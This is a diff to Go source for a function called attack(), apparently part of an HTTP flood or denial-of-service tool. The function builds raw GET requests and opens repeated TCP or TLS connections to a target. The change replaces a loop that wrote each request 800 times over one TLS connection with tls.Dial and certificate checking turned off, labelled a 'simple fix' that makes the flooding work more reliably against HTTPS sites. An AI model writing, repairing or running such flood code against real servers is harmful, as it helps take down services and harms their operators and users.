@@ -105,15 +105,14 @@ func attack() {
 		}
 		get_host := "GET " + path + " HTTP/1.1\r\nHost: " + addr + "\r\n"
 		request := get_host + header
-		s, err = net.Dial("tcp", addr)
 		if port == "443" {
-			x := tls.Client(s, &tls.Config{
-				ServerName: addr, InsecureSkipVerify: true,
-			})
-			for t := 0; t < 800; t++ {
-				x.Write([]byte(request))
+			cfg := &tls.Config{
+				InsecureSkipVerify: true,
+				ServerName:         ip, //simple fix
 			}
-			x.Close()
+			s, err = tls.Dial("tcp", addr, cfg)
+		} else {
+			s, err = net.Dial("tcp", addr)
 		}
 		if err != nil {
 			fmt.Println("Connection Down!!!")
@@ -123,7 +122,6 @@ func attack() {
 			}
 			s.Close()
 		}
-		s.Close()
 	}
 }
 
